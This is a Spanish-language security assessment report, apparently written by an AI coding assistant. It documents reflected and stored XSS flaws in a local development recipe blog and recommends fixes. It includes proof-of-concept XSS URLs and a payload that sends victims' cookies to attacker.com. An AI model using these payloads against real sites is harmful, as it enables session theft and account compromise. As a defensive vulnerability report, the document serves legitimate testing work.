# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Hora:** 16:07:07  
**Analista:** GitHub Copilot CLI  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS

---

## Resumen Ejecutivo

Se identificaron **dos vulnerabilidades de tipo Cross-Site Scripting (XSS)** en la aplicación web "Blog de Recetas":

1. **XSS Reflejado** — Parámetro `search` en la función de búsqueda.
2. **XSS Almacenado** — Parámetros `name` y `comment` en la sección de comentarios (almacenamiento en `localStorage`).

Ambas vulnerabilidades son explotables y pueden comprometer a los usuarios que visiten la página.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" que ofrece:
- Un buscador de recetas (con parámetro GET `search`).
- Una sección de comentarios (con parámetros GET `name` y `comment`).

El procesamiento de los datos de usuario se realiza íntegramente en el lado del cliente mediante JavaScript.

---

## Vulnerabilidades Encontradas

### 1. XSS Reflejado — Parámetro `search`

**Severidad:** Alta  
**Tipo:** Reflected XSS  
**Parámetro afectado:** `search`  

#### Descripción Técnica

El valor del parámetro `search` se obtiene directamente de la URL mediante `URLSearchParams` y se inserta sin ningún tipo de sanitización ni codificación en el DOM a través de `document.write`:

```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

Al no existir ningún proceso de escape o validación, cualquier payload HTML/JavaScript incluido en el parámetro `search` será interpretado por el navegador como código, ejecutándose en el contexto de la página.

#### Prueba de Concepto

URL de explotación:
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS_Reflejado')>
```

**Resultado:** El navegador intenta cargar la imagen inexistente, lo que dispara el evento `onerror` y ejecuta el código JavaScript `alert('XSS_Reflejado')`.

Payload alternativo (exfiltración de cookies):
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

---

### 2. XSS Almacenado — Sección de Comentarios

**Severidad:** Crítica  
**Tipo:** Stored XSS  
**Parámetros afectados:** `name`, `comment`  

#### Descripción Técnica

Los parámetros `name` y `comment` de la URL se almacenan en `localStorage` sin sanitización:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
// ...
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
```

Al mostrar los comentarios almacenados, el contenido se vuelca nuevamente en el DOM sin sanitizar mediante `document.write`:

```javascript
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Aunque el vector de persistencia es `localStorage` (limitado al mismo origen y navegador), cualquier payload malicioso guardado se ejecutará **cada vez que el usuario cargue la página**, hasta que se limpien los comentarios.

#### Prueba de Concepto

URL de explotación:
```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS_Almacenado_Nombre')>&comment=<img src=x onerror=alert('XSS_Almacenado_Comentario')>
```

**Resultado:** Al acceder a la URL, los payloads se almacenan en `localStorage`. En cada visita posterior a la página, los scripts maliciosos se ejecutan automáticamente al renderizar los comentarios.

---

## Líneas de Código Vulnerables

| Línea | Código Vulnerable | Tipo |
|-------|-------------------|------|
| 152 | `document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');` | Reflected XSS |
| 211 | `document.write('<div class="comment-author">' + c.name + '</div>');` | Stored XSS |
| 212 | `document.write('<div>' + c.comment + '</div>');` | Stored XSS |

---

## Impacto

- **Robo de sesiones/cookies** de usuarios víctimas.
- **Redirección** a sitios maliciosos (phishing).
- **Ejecución de acciones no autorizadas** en nombre del usuario.
- **Defacement** visual de la página.
- En el caso del XSS Almacenado: **persistencia del ataque** sin necesidad de que la víctima haga clic en un enlace malicioso.

---

## Recomendaciones

1. **Sanitizar y escapar toda entrada del usuario** antes de insertarla en el DOM. Usar funciones como `textContent` en lugar de `innerHTML`/`document.write`, o bibliotecas como DOMPurify.

   ```javascript
   // Inseguro:
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

   // Seguro:
   const resultEl = document.createElement('p');
   resultEl.textContent = 'Resultados para: ' + searchTerm;
   document.querySelector('.result').appendChild(resultEl);
   ```

2. **Evitar el uso de `document.write`** con datos provenientes del usuario.

3. **Implementar una Content Security Policy (CSP)** que restrinja la ejecución de scripts inline.

4. **Validar los parámetros de entrada** en el lado del cliente y, si existe procesamiento en el servidor, también en el servidor.

5. **Utilizar `textContent`/`innerText`** en lugar de `innerHTML` o `document.write` para mostrar datos de usuario.

---

## Conclusión

La aplicación analizada presenta vulnerabilidades críticas de XSS tanto de tipo reflejado como almacenado, ambas explotables directamente desde el navegador. La causa raíz es el uso de `document.write` con valores de parámetros URL sin ningún tipo de sanitización. Se recomienda corrección inmediata antes de exponer la aplicación a usuarios reales.

---

**Estado:** ✅ Vulnerabilidades confirmadas y explotadas  
**CVSS estimado:** 7.4 (Alto) — Reflected XSS | 8.8 (Alto) — Stored XSS
